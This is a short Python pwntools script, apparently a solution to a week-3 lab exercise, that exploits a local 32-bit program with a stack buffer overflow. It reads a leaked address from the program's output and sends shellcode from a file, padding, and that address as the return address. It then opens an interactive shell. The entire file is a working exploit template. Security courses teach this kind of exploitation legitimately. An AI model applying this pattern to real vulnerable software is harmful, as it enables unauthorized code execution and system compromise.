#!/usr/bin/env python

from pwn import *

p = process('/home/labs/week3/stack-ovfl-sc-32/stack-ovfl-sc-32')

addr = str(p.recvline().split()[-1])
print("string --> " + addr)
print("hex --> " + str(addr))

buffer = ""
buffer += open("shellcode.bin", "r").read()
buffer += "a"*100 + p32(int(addr,16))*2



p.sendline(buffer)
p.interactive()
